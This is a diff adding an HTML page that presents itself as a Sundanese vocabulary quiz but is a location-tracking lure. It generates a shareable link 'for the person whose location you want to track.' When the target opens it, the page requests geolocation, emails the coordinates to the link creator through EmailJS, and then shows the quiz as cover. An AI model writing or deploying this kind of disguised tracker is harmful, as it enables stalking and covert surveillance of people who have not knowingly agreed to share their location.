@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Kuis Bahasa Sunda untuk orang jawa</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 30px;
+      text-align: center;
+      max-width: 700px;
+      margin: auto;
+      background-color: #f9f9f9;
+    }
+    input[type="text"] {
+      width: 90%;
+      padding: 10px;
+      font-size: 1em;
+    }
+    a {
+      color: blue;
+      word-break: break-word;
+    }
+    .question {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .question p {
+      font-weight: bold;
+    }
+    .option {
+      margin: 5px 0;
+      display: block;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1em;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+  </style>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init('xCZlZz-fwMVrgM0gQ'); // GANTI dengan public key dari EmailJS
+    })();
+  </script>
+</head>
+<body>
+  <h1 id="judul">Memuat...</h1>
+  <div id="app">Memuat...</div>
+
+  <script>
+    const app = document.getElementById('app');
+    const judul = document.getElementById('judul');
+    const params = new URLSearchParams(window.location.search);
+    const lat = params.get('lat');
+    const lng = params.get('lng');
+    const shareId = params.get('share');
+
+    const kuis = [
+      {
+        soal: "Naon hartina kecap 'ngabandungan' dina Basa Sunda?",
+        pilihan: ["Ngadengekeun", "Nganggeuskeun", "Nyaritakeun", "Ngamimitian"],
+        jawaban: 0
+      },
+      {
+        soal: "Kecap 'dugdag' kaasup kana jenis kecap naon?",
+        pilihan: ["Kecap paguneman", "Kecap sarua", "Kecap sato", "Kecap sora (onomatope)"],
+        jawaban: 3
+      },
+      {
+        soal: "‘Sabaraha’ dina Basa Sunda hartina?",
+        pilihan: ["Kumaha", "Iraha", "Sakedik", "Berapa"],
+        jawaban: 3
+      },
+      {
+        soal: "Kecap 'leumpang' hartina?",
+        pilihan: ["Milu", "Numpak", "Jalan", "Ngagorowok"],
+        jawaban: 2
+      },
+      {
+        soal: "Kecap 'abdi' dina Basa Sunda kasar nyaéta?",
+        pilihan: ["Kuring", "Urang", "Manéh", "Anjeun"],
+        jawaban: 0
+      },
+      {
+        soal: "Kecap 'anjeun' hartina?",
+        pilihan: ["Saya", "Kamu", "Mereka", "Dia"],
+        jawaban: 1
+      },
+      {
+        soal: "‘Sabaraha’ jeung ‘sababaraha’ beda dina naon?",
+        pilihan: ["Jumlah", "Waktu", "Ukuran", "Harti"],
+        jawaban: 0
+      },
+      {
+        soal: "Kecap pangganti untuk 'dia' dina Basa Sunda loma nyaéta?",
+        pilihan: ["Manehna", "Urang", "Sasaha", "Kuring"],
+        jawaban: 0
+      },
+      {
+        soal: "Kecap 'kaasup' hartina?",
+        pilihan: ["Dijieun", "Termasuk", "Diluar", "Disarankeun"],
+        jawaban: 1
+      },
+      {
+        soal: "‘Kumaha damang?’ hartina?",
+        pilihan: ["Apa kabar?", "Ke mana?", "Kapan datang?", "Sudah makan?"],
+        jawaban: 0
+      }
+    ];
+
+    function tampilkanKuis() {
+      judul.textContent = "Kuis Bahasa Sunda";
+      kuis.forEach((item, index) => {
+        const div = document.createElement("div");
+        div.className = "question";
+        const p = document.createElement("p");
+        p.textContent = `${index + 1}. ${item.soal}`;
+        div.appendChild(p);
+
+        item.pilihan.forEach((opsi, i) => {
+          const label = document.createElement("label");
+          label.className = "option";
+          const radio = document.createElement("input");
+          radio.type = "radio";
+          radio.name = `q${index}`;
+          radio.value = i;
+          label.appendChild(radio);
+          label.append(` ${opsi}`);
+          div.appendChild(label);
+        });
+
+        app.appendChild(div);
+      });
+
+      const btn = document.createElement("button");
+      btn.textContent = "Kirim Jawaban";
+      btn.onclick = periksaJawaban;
+      app.appendChild(btn);
+    }
+
+    function periksaJawaban() {
+      let benar = 0;
+      kuis.forEach((item, i) => {
+        const jawaban = document.querySelector(`input[name="q${i}"]:checked`);
+        if (jawaban && parseInt(jawaban.value) === item.jawaban) {
+          benar++;
+        }
+      });
+      app.innerHTML = `<h2>Skor Anda: ${benar} / ${kuis.length}</h2>`;
+    }
+
+    function kirimEmailLokasi(lat, lng, shareId) {
+      const serviceID = 'kev123';     // GANTI dengan Service ID dari EmailJS
+      const templateID = 'kev1234';   // GANTI dengan Template ID dari EmailJS
+
+      const templateParams = {
+        to_name: 'Penerima Lokasi',
+        message: `Lokasi dari shareId ${shareId}:\nhttps://www.google.com/maps?q=${lat},${lng}`,
+        lat: lat,
+        lng: lng,
+        share_id: shareId
+      };
+
+      emailjs.send(serviceID, templateID, templateParams)
+        .then(response => {
+          console.log('Email terkirim!', response.status, response.text);
+        }, error => {
+          console.error('Gagal mengirim email.', error);
+        });
+    }
+
+    function tampilkanLink() {
+      judul.textContent = "Pelacak Lokasi Sederhana";
+      const id = Math.random().toString(36).substr(2, 6);
+      const link = `${location.origin}${location.pathname}?share=${id}`;
+      app.innerHTML = `
+        <p>Kirim link ini ke orang yang ingin Anda lacak lokasinya:</p>
+        <input type="text" readonly value="${link}" onclick="this.select()" />
+        <p>Setelah mereka membuka link dan mengizinkan akses lokasi, kuis akan muncul dan lokasi dikirim ke email Anda.</p>
+      `;
+    }
+
+    if (lat && lng) {
+      // Mode penerima: tampilkan kuis + kirim email
+      tampilkanKuis();
+      if (params.get('from')) {
+        kirimEmailLokasi(lat, lng, params.get('from'));
+      }
+    } else if (shareId) {
+      // Mode pengirim
+      judul.textContent = "Meminta izin lokasi...";
+      if (!navigator.geolocation) {
+        app.innerHTML = '<p>Browser Anda tidak mendukung Geolocation.</p>';
+      } else {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const redirectUrl = `${location.origin}${location.pathname}?lat=${lat}&lng=${lng}&from=${shareId}`;
+          kirimEmailLokasi(lat, lng, shareId);
+          setTimeout(() => {
+            location.href = redirectUrl;
+          }, 2000);
+        }, () => {
+          app.innerHTML = '<p>Gagal mendapatkan lokasi. Mohon izinkan akses lokasi.</p>';
+        });
+      }
+    } else {
+      tampilkanLink();
+    }
+  </script>
+</body>
+</html>
